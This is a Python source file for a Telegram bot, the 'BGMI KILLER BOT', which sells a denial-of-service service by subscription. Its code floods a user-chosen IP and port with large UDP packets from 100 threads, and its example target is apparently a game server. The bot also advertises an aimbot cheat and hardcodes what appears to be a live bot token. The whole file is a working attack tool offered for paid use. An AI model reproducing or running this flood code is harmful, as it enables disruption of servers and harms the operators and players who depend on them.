# bot.py - FINAL CONFLICT FREE

import telebot
import datetime
import os
import time
import random
import string
import json
import threading
import socket
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton

# ==================== BOT TOKEN ====================
BOT_TOKEN = '8424019822:AAEBYBEuVcWy7Djil2lT5Lin9FMowk6C6NE'
bot = telebot.TeleBot(BOT_TOKEN)

# IMPORTANT: Force remove webhook at start
bot.remove_webhook()
time.sleep(2)

# ==================== ADMIN ID ====================
ADMIN_ID = "7201893742"

# ==================== FILES ====================
USER_FILE = "users.txt"
KEYS_FILE = "license_keys.json"
SUBSCRIPTIONS_FILE = "subscriptions.json"
LOG_FILE = "log.txt"

# ==================== FUNCTIONS ====================

def load_keys():
    try:
        with open(KEYS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_keys(keys):
    with open(KEYS_FILE, "w") as f:
        json.dump(keys, f, indent=4)

def load_subs():
    try:
        with open(SUBSCRIPTIONS_FILE, "r") as f:
            return json.load(f)
    except:
        return {}

def save_subs(subs):
    with open(SUBSCRIPTIONS_FILE, "w") as f:
        json.dump(subs, f, indent=4)

def gen_key():
    return ''.join(random.choices(string.ascii_uppercase + string.digits, k=16))

def has_sub(user_id):
    user_id = str(user_id)
    if user_id == ADMIN_ID:
        return True
    subs = load_subs()
    if user_id in subs:
        try:
            expiry = datetime.datetime.fromisoformat(subs[user_id])
            if expiry > datetime.datetime.now():
                return True
        except:
            pass
    return False

def add_sub(user_id, days):
    subs = load_subs()
    new_expiry = datetime.datetime.now() + datetime.timedelta(days=days)
    subs[str(user_id)] = new_expiry.isoformat()
    save_subs(subs)
    return new_expiry

# ==================== UDP FLOOD ====================

def udp_flood(target, port, sec):
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        packet = random._urandom(65507)
        end = time.time() + sec
        count = 0
        while time.time() < end:
            sock.sendto(packet, (target, int(port)))
            count += 1
        sock.close()
        return count
    except:
        return 0

def start_attack(target, port, sec):
    threads = []
    results = []
    
    def worker():
        r = udp_flood(target, port, sec)
        results.append(r)
    
    for i in range(100):
        t = threading.Thread(target=worker)
        t.start()
        threads.append(t)
    
    for t in threads:
        t.join()
    
    return sum(results)

# ==================== COMMANDS ====================

@bot.message_handler(commands=['start'])
def start_cmd(message):
    markup = InlineKeyboardMarkup(row_width=2)
    btn1 = InlineKeyboardButton("DDOS ATTACK", callback_data="menu_ddos")
    btn2 = InlineKeyboardButton("ESP AIMBOT", callback_data="menu_esp")
    btn3 = InlineKeyboardButton("PRICES", callback_data="menu_prices")
    markup.add(btn1, btn2)
    markup.add(btn3)
    
    bot.reply_to(message, "BGMI KILLER BOT ACTIVE\n\nSend /attack IP PORT TIME\n\nExample: /attack 13.126.255.102 14001 60", reply_markup=markup)

@bot.message_handler(commands=['attack'])
def attack_cmd(message):
    user_id = str(message.chat.id)
    
    if user_id != ADMIN_ID and not has_sub(user_id):
        bot.reply_to(message, "NO ACCESS! Contact @M_JITENDRA")
        return
    
    cmd = message.text.split()
    if len(cmd) != 4:
        bot.reply_to(message, "Usage: /attack IP PORT TIME\nExample: /attack 13.126.255.102 14001 60")
        return
    
    target = cmd[1]
    port = cmd[2]
    sec = int(cmd[3])
    
    if sec > 120:
        sec = 120
    
    bot.reply_to(message, f"ATTACK STARTED!\nTarget: {target}:{port}\nTime: {sec}s\n\nFlooding...")
    
    def run():
        total = start_attack(target, port, sec)
        bot.reply_to(message, f"ATTACK COMPLETE!\nPackets Sent: {total:,}\nTarget: {target}:{port}\n\nCheck your game ping!")
    
    threading.Thread(target=run).start()

@bot.message_handler(commands=['test'])
def test_cmd(message):
    bot.reply_to(message, "Bot is working! Owner: @M_JITENDRA")

@bot.message_handler(commands=['help'])
def help_cmd(message):
    text = """BGMI KILLER BOT

/start - Main menu
/attack IP PORT TIME - Start attack
/test - Check if bot works
/help - This menu

To get access, contact @M_JITENDRA"""
    bot.reply_to(message, text)

# ==================== CALLBACKS ====================

@bot.callback_query_handler(func=lambda call: True)
def handle_callback(call):
    if call.data == "menu_ddos":
        bot.answer_callback_query(call.id, "Use: /attack IP PORT TIME")
        bot.send_message(call.message.chat.id, "DDOS ATTACK\n\nSend: /attack 13.126.255.102 14001 60")
    
    elif call.data == "menu_esp":
        bot.answer_callback_query(call.id, "Contact @M_JITENDRA")
        bot.send_message(call.message.chat.id, "ESP AIMBOT\n\nContact @M_JITENDRA for prices")
    
    elif call.data == "menu_prices":
        bot.answer_callback_query(call.id, "Prices below")
        bot.send_message(call.message.chat.id, """PRICES

DDOS:
7 Days - Rs 160
Month - Rs 199
Season - Rs 250
Permanent - Rs 299

ESP:
7 Days - Rs 199
Month - Rs 250
Season - Rs 350 (DDOS FREE)

Contact: @M_JITENDRA""")

# ==================== UNKNOWN ====================

@bot.message_handler(func=lambda m: True)
def unknown(m):
    bot.reply_to(m, "Unknown command. Send /help")

# ==================== MAIN ====================

print("""
========================================
      BGMI KILLER BOT - READY
         BY @M_JITENDRA
========================================

Bot is running!
Admin: 7201893742

Bot Ready!
""")

# Final conflict fix - ensure only one polling
if __name__ == "__main__":
    try:
        bot.infinity_polling(timeout=10, long_polling_timeout=5)
    except Exception as e:
        print(f"Error: {e}")
        time.sleep(5)
        bot.infinity_polling(timeout=10)
